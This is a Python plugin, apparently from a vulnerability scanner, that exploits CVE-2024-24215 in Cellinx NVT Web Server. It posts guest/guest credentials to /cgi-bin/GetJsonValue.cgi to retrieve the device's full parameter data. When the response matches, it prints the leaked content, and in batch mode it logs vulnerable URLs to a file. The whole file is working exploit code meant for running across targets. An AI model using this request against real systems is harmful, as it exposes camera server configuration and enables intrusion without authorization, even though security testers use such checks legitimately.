#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2024_24215:
    def get_url(self,input_url):
        try:
            url = input_url + "/cgi-bin/GetJsonValue.cgi?TYPE=json"
            data = {"jsonData":{"username":"guest","password":"guest","file":"param","data":"All"}}

            req = requests.post(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,json=data)
            if "General" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Cellinx", '目标存在Cellinx NVT Web Server信息泄露漏洞')
                    OutPrintInfo("Cellinx", url)
                    OutPrintInfo("Cellinx", 'Data: {"jsonData":{"username":"guest","password":"guest","file":"param","data":"All"}}')
                    OutPrintInfo("Cellinx", f"响应:\n{req.text.strip()}")
                else:
                    OutPrintInfoSuc("Cellinx", f'目标存在Cellinx NVT Web Server信息泄露漏洞: {url}')
                    OutPutFile("cellinx_2024_24215.txt",f'目标存在Cellinx NVT Web Server信息泄露漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Cellinx", f'目标不存在Cellinx NVT Web Server信息泄露漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Cellinx",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Cellinx", '开始检测Cellinx NVT Web Server信息泄露漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Cellinx", 'Cellinx NVT Web Server信息泄露漏洞检测结束')

